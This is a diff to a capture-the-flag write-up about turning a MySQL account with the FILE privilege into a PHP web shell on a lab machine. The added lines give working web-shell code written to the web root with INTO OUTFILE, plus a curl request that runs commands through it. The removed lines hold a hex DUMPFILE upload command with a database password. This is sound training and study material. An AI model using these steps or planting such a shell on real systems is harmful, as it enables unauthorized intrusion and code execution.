@@ -83,15 +83,10 @@ The flag is not in the table. It is the table's name — the same shape as a fla
 
 ## From MySQL to a web shell
 
-`wpmaster` has `FILE` on `*.*`, which means the server writes files on our behalf, as the `mysql` user. The web root is writable, so the database becomes an upload primitive.
+`wpmaster` has `FILE` on `*.*`, which means the server writes files on our behalf, as the `mysql` user. The web root is writable, so the database becomes an upload primitive. One line of PHP does the job:
 
-The detail that decides whether this works is `INTO DUMPFILE` and not `INTO OUTFILE`: `OUTFILE` escapes what it writes, so every newline becomes a literal backslash-n and the PHP arrives dead. `DUMPFILE` writes the bytes raw — and it takes a single row, which a `SELECT` of one literal is.
-
-To avoid quoting a whole PHP file inside SQL, hex:
-
-```sh
-printf "SELECT 0x%s INTO DUMPFILE '/var/www/html/sh.php';\n" "$(xxd -p sh.php | tr -d '\n')" > w.sql
-cat w.sql | mysql -h 10.150.150.145 -u wpmaster -p'-!UlTr4S3cUr3P455W0rd-!' wordpress
+```sql
+select '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' into outfile '/var/www/html/sh.php';
 ```
 
 ```sh
@@ -102,7 +97,9 @@ curl -s 'http://10.150.150.145/sh.php?cmd=id'
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-> ⚠️ **Important Note:** MySQL's file write is only as good as the user it runs as. `mysqld` runs as `mysql`, so `FILE` gives write as `mysql` — a lateral step, not escalation. It lands in the web root here only because that directory is world-writable.
+> ⚠️ **Important Note:** `INTO OUTFILE` writes through MySQL's escaped text format: NUL, tab, newline, carriage return and backslash come out escaped. My payload is a single line with no backslash, so nothing in it is touched — which is exactly why the simple shell survived. A multi-line script would arrive with every newline mangled; for that the route is `INTO DUMPFILE` (raw bytes, single row) fed with a hex literal, which also solves the quoting problem of embedding a whole file inside SQL.
+
+And MySQL's file write is only as good as the user it runs as. `mysqld` runs as `mysql`, so this is a lateral step, not escalation. It lands in the web root here only because that directory is world-writable.
 
 ## The password was written down
 
@@ -124,7 +121,7 @@ Root itself stayed open, and this is where I stopped. SUID and SGID are stock De
 - A backup is a second copy of the machine's secrets, dated. `wp-config.php` inside an archive gave up a live database account.
 - Flags do not have to be content: this one was a table name. List identifiers before reading rows.
 - A hash that resists the dictionary is information, not a wall. The plaintext was in a text file on the same host. When cracking stops paying, look for where a human would have written the password down.
-- `INTO DUMPFILE` for raw bytes, `INTO OUTFILE` for escaped text. Getting that backwards produces a PHP file that executes as nothing.
+- `INTO OUTFILE` keeps a one-line payload intact because it only escapes newlines, tabs and backslashes — a multi-line script arrives mangled, and that is the case for `INTO DUMPFILE` with a hex literal.
 - Know which principal your primitive runs as before calling it escalation: MySQL `FILE` writes as `mysql`, not as root.
 - Five flags, five layers — a listing, an archive, a database, a panel, a home directory. One flag per door you open.
 
